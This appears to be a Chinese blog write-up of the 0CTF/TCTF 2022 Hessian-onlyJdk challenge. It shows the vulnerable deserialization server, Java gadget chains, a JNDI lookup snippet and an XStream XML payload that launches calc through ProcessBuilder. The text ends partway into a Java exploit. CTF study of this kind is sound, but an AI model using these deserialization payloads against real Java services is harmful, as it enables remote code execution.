@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>0ctf Tctf 2022 Hessian Only Jdk 复现和学习</title>
+    <meta name="description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta name="keywords" content='Web'>
+
+    <meta property="og:url" content="https://kingbridgess.github.io/posts/0ctf-tctf-2022-hessian-only-jdk-%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="0ctf Tctf 2022 Hessian Only Jdk 复现和学习">
+    <meta property="og:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta property="og:image" content="/images/avatar.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="0ctf Tctf 2022 Hessian Only Jdk 复现和学习">
+    <meta name="twitter:description" content="Fortunate enough to get a glimpse of the feast of techiques.">
+    <meta property="twitter:domain" content="https://kingbridgess.github.io/posts/0ctf-tctf-2022-hessian-only-jdk-%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/">
+    <meta property="twitter:url" content="https://kingbridgess.github.io/posts/0ctf-tctf-2022-hessian-only-jdk-%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/">
+    <meta name="twitter:image" content="/images/avatar.jpg">
+
+    
+    <link rel="canonical" href="https://kingbridgess.github.io/posts/0ctf-tctf-2022-hessian-only-jdk-%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/" />
+
+    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="https://kingbridgess.github.io/css/dark.css">
+
+    <script src="https://kingbridgess.github.io/js/svg-injector.min.js"></script>
+    <script src="https://kingbridgess.github.io/js/feather-icons.min.js"></script>
+    <script src="https://kingbridgess.github.io/js/main.js"></script>
+
+    
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://kingbridgess.github.io">
+                <img src="https://kingbridgess.github.io/images/avatar.jpg" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://kingbridgess.github.io">BRIdGE</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/posts/"> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/tags/"> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/about"> About </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://kingbridgess.github.io/contact/"> Contact </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/posts/"> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/tags/"> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/about"> About </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://kingbridgess.github.io/contact/"> Contact </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>0ctf Tctf 2022 Hessian Only Jdk 复现和学习</h1>
+        <small role="doc-subtitle"></small>
+        <p class="post-date">
+            September 21, 2022
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://kingbridgess.github.io/tags/web">Web</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <p>麻了，一个比赛就看了一道题还做不动555</p>
+<p>题目的环境和 write up</p>
+<p><a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk">https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk</a></p>
+<h2 id="简单分析">简单分析</h2>
+<p>路由简单粗暴的反序列化点</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.ctf.hessian.onlyJdk<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.caucho.hessian.io.Hessian2Input<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.net.httpserver.HttpExchange<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.net.httpserver.HttpHandler<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.net.httpserver.HttpServer<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.InputStream<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.OutputStream<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.net.InetSocketAddress<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.concurrent.Executors<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Index</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;server start&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    HttpServer server <span style="color:#ff79c6">=</span> HttpServer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">create</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> InetSocketAddress<span style="color:#ff79c6">(</span>8090<span style="color:#ff79c6">),</span> 0<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    server<span style="color:#ff79c6">.</span><span style="color:#50fa7b">createContext</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> MyHandler<span style="color:#ff79c6">());</span>
+</span></span><span style="display:flex;"><span>    server<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setExecutor</span><span style="color:#ff79c6">(</span>Executors<span style="color:#ff79c6">.</span><span style="color:#50fa7b">newCachedThreadPool</span><span style="color:#ff79c6">());</span>
+</span></span><span style="display:flex;"><span>    server<span style="color:#ff79c6">.</span><span style="color:#50fa7b">start</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">MyHandler</span> <span style="color:#8be9fd;font-style:italic">implements</span> HttpHandler <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">handle</span><span style="color:#ff79c6">(</span>HttpExchange t<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>      String response <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Welcome to 0CTF 2022!&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>      InputStream is <span style="color:#ff79c6">=</span> t<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRequestBody</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        Hessian2Input input <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Hessian2Input<span style="color:#ff79c6">(</span>is<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        input<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        response <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;oops! something is wrong&#34;</span><span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span> 
+</span></span><span style="display:flex;"><span>      t<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sendResponseHeaders</span><span style="color:#ff79c6">(</span>200<span style="color:#ff79c6">,</span> response<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">());</span>
+</span></span><span style="display:flex;"><span>      OutputStream os <span style="color:#ff79c6">=</span> t<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getResponseBody</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>      os<span style="color:#ff79c6">.</span><span style="color:#50fa7b">write</span><span style="color:#ff79c6">(</span>response<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getBytes</span><span style="color:#ff79c6">());</span>
+</span></span><span style="display:flex;"><span>      os<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p>然后是 jvmtiagent 指定的类。这里的坑点在于 jdgui 打开这个类不显示包名</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// Source code recreated from a .class file by IntelliJ IDEA
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// (powered by FernFlower decompiler)
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.sun.org.apache.xml.internal.security.utils<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">JavaUtils</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#50fa7b">JavaUtils</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">hello</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;hello&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">writeBytesToFilename</span><span style="color:#ff79c6">(</span>String var0<span style="color:#ff79c6">,</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> var1<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;writeBytesToFilename&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p>ok，这个类寄了</p>
+<p>根据题目给了两个CVE，其中 CVE-2021-43297 可以调用任意共有类的toString属性</p>
+<p>具体见</p>
+<p><a href="https://paper.seebug.org/1814/#_5">https://paper.seebug.org/1814/#_5</a></p>
+<p>但是必须是Public的类</p>
+<p>而CVE-2021-21346则是Xstream反序列化的链，具体见</p>
+<p><a href="https://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/">https://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/</a></p>
+<p>会发现 Base64Data#toString 和 MultiUIDefaults#toString 都可以导致可以命令执行</p>
+<h2 id="失败的尝试----base64data">失败的尝试 &ndash; Base64Data</h2>
+<p>喜闻乐见的拼链子。上述文章有这么一段话</p>
+<blockquote>
+<p>之前看到过jdk中其实有个toString的利用链：</p>
+<pre tabindex="0"><code>javax.swing.MultiUIDefaults.toString
+           UIDefaults.get
+               UIDefaults.getFromHashTable
+                   UIDefaults$LazyValue.createValue
+                   SwingLazyValue.createValue
+                       javax.naming.InitialContext.doLookup()
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>UIDefaults uiDefaults <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> UIDefaults<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>uiDefaults<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;aaa&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> SwingLazyValue<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;javax.naming.InitialContext&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;doLookup&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{</span><span style="color:#f1fa8c">&#34;ldap://127.0.0.1:6666&#34;</span><span style="color:#ff79c6">}));</span>
+</span></span><span style="display:flex;"><span>Class<span style="color:#ff79c6">&lt;?&gt;</span> aClass <span style="color:#ff79c6">=</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;javax.swing.MultiUIDefaults&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>Constructor<span style="color:#ff79c6">&lt;?&gt;</span> declaredConstructor <span style="color:#ff79c6">=</span> aClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredConstructor</span><span style="color:#ff79c6">(</span>UIDefaults<span style="color:#ff79c6">[].</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>declaredConstructor<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>o <span style="color:#ff79c6">=</span> declaredConstructor<span style="color:#ff79c6">.</span><span style="color:#50fa7b">newInstance</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{</span><span style="color:#ff79c6">new</span> UIDefaults<span style="color:#ff79c6">[]{</span>uiDefaults<span style="color:#ff79c6">}});</span>
+</span></span></code></pre></div><p>经过测试，发现没法使用：</p>
+<ul>
+<li>javax.swing.MultiUIDefaults是peotect类，只能在javax.swing.中使用，而且Hessian2拿到了构造器，但是没有setAccessable，newInstance就没有权限</li>
+<li>所以要找链的话需要类是public的，构造器也是public的，构造器的参数个数不要紧，hessian2会自动挨个测试构造器直到成功</li>
+</ul>
+</blockquote>
+<p>所以我后来基本上一直在尝试 Base64Data 链。结果就这样和预期解失之交臂。</p>
+<p>接下来把 <a href="http://tttang.com/archive/1699/#toc_1414">http://tttang.com/archive/1699/#toc_1414</a> 的Base64Data POC 还原成正常的代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;map&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;entry&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;jdk.nashorn.internal.objects.NativeString&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;flags&gt;</span>0<span style="color:#ff79c6">&lt;/flags&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;value</span> <span style="color:#50fa7b">class=</span><span style="color:#f1fa8c">&#39;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#39;</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;dataHandler&gt;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;dataSource</span> <span style="color:#50fa7b">class=</span><span style="color:#f1fa8c">&#39;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#39;</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;contentType&gt;</span>text/plain<span style="color:#ff79c6">&lt;/contentType&gt;</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;is</span> <span style="color:#50fa7b">class=</span><span style="color:#f1fa8c">&#39;java.io.SequenceInputStream&#39;</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#ff79c6">&lt;e</span> <span style="color:#50fa7b">class=</span><span style="color:#f1fa8c">&#39;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#39;</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#ff79c6">&lt;iterator</span> <span style="color:#50fa7b">class=</span><span style="color:#f1fa8c">&#39;javax.imageio.spi.FilterIterator&#39;</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>                                    <span style="color:#ff79c6">&lt;iter</span> <span style="color:#50fa7b">class=</span><span style="color:#f1fa8c">&#39;java.util.ArrayList$Itr&#39;</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#ff79c6">&lt;cursor&gt;</span>0<span style="color:#ff79c6">&lt;/cursor&gt;</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#ff79c6">&lt;lastRet&gt;</span>-1<span style="color:#ff79c6">&lt;/lastRet&gt;</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#ff79c6">&lt;expectedModCount&gt;</span>1<span style="color:#ff79c6">&lt;/expectedModCount&gt;</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#ff79c6">&lt;outer-class&gt;</span>
+</span></span><span style="display:flex;"><span>                                            <span style="color:#ff79c6">&lt;java.lang.ProcessBuilder&gt;</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#ff79c6">&lt;command&gt;</span>
+</span></span><span style="display:flex;"><span>                                                    <span style="color:#ff79c6">&lt;string&gt;</span>calc<span style="color:#ff79c6">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#ff79c6">&lt;/command&gt;</span>
+</span></span><span style="display:flex;"><span>                                            <span style="color:#ff79c6">&lt;/java.lang.ProcessBuilder&gt;</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#ff79c6">&lt;/outer-class&gt;</span>
+</span></span><span style="display:flex;"><span>                                    <span style="color:#ff79c6">&lt;/iter&gt;</span>
+</span></span><span style="display:flex;"><span>                                    <span style="color:#ff79c6">&lt;filter</span> <span style="color:#50fa7b">class=</span><span style="color:#f1fa8c">&#39;javax.imageio.ImageIO$ContainsFilter&#39;</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#ff79c6">&lt;method&gt;</span>
+</span></span><span style="display:flex;"><span>                                            <span style="color:#ff79c6">&lt;class&gt;</span>java.lang.ProcessBuilder<span style="color:#ff79c6">&lt;/class&gt;</span>
+</span></span><span style="display:flex;"><span>                                            <span style="color:#ff79c6">&lt;name&gt;</span>start<span style="color:#ff79c6">&lt;/name&gt;</span>
+</span></span><span style="display:flex;"><span>                                            <span style="color:#ff79c6">&lt;parameter-types/&gt;</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#ff79c6">&lt;/method&gt;</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#ff79c6">&lt;name&gt;</span>start<span style="color:#ff79c6">&lt;/name&gt;</span>
+</span></span><span style="display:flex;"><span>                                    <span style="color:#ff79c6">&lt;/filter&gt;</span>
+</span></span><span style="display:flex;"><span>                                    <span style="color:#ff79c6">&lt;next/&gt;</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#ff79c6">&lt;/iterator&gt;</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#ff79c6">&lt;type&gt;</span>KEYS<span style="color:#ff79c6">&lt;/type&gt;</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#ff79c6">&lt;/e&gt;</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#ff79c6">&lt;in</span> <span style="color:#50fa7b">class=</span><span style="color:#f1fa8c">&#39;java.io.ByteArrayInputStream&#39;</span><span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#ff79c6">&lt;buf&gt;&lt;/buf&gt;</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#ff79c6">&lt;pos&gt;</span>0<span style="color:#ff79c6">&lt;/pos&gt;</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#ff79c6">&lt;mark&gt;</span>0<span style="color:#ff79c6">&lt;/mark&gt;</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#ff79c6">&lt;count&gt;</span>0<span style="color:#ff79c6">&lt;/count&gt;</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#ff79c6">&lt;/in&gt;</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;/is&gt;</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;consumed&gt;</span>false<span style="color:#ff79c6">&lt;/consumed&gt;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/dataSource&gt;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;transferFlavors/&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;/dataHandler&gt;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;dataLen&gt;</span>0<span style="color:#ff79c6">&lt;/dataLen&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/value&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/jdk.nashorn.internal.objects.NativeString&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;string&gt;</span>test<span style="color:#ff79c6">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/entry&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/map&gt;</span>
+</span></span></code></pre></div><p>还原后：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> test<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.caucho.hessian.io.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sun.reflect.ReflectionFactory<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sun.swing.SwingLazyValue<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.security.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.SequenceInputStream<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.activation.DataHandler<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.activation.DataSource<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.management.BadAttributeValueExpException<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.swing.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.xml.transform.Templates<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayInputStream<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayOutputStream<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.*<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.security.KeyPair<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.security.KeyPairGenerator<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.security.PrivateKey<span style="color:#ff79c6">;</span>
